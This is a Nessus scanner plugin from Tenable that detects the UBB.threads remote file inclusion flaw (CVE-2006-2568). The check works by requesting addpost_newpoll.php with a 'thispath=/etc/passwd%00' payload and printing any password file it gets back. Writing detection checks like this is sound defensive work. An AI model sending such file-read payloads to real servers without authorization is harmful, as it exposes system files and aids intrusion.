#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(21605);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2006-2568");
  script_bugtraq_id(18075);
  script_osvdb_id(25714);

  script_name(english:"UBB.threads addpost_newpoll.php thispath Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file using UBB.threads");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to remote file inclusion attacks." );
 script_set_attribute(attribute:"description", value:
"The version of UBB.threads installed on the remote host fails to
sanitize input to the 'thispath' parameter before using it in a PHP
include() function in the 'addpost_newpoll.php' script.  Provided
PHP's 'register_globals' setting is enabled, an unauthenticated
attacker may be able to exploit this flaw to view arbitrary files on
the remote host or to execute arbitrary PHP code, possibly taken from
third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://www.ubbcentral.com/boards/showflat.php/Cat/0/Number/4560078/an/0/page/0" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to UBB.threads 6.5.3 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/27");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/05/22");
 script_cvs_date("$Date: 2011/03/14 21:48:14 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");

  script_dependencies("ubbthreads_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/ubbthreads");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/ubbthreads"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/addpost_newpoll.php?",
      "addpoll=preview&",
      "thispath=", file ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(/etc/passwd\\0/templates/.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      report = string(
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = NULL;

    security_warning(port:port, extra:report);
    exit(0);
  }
}
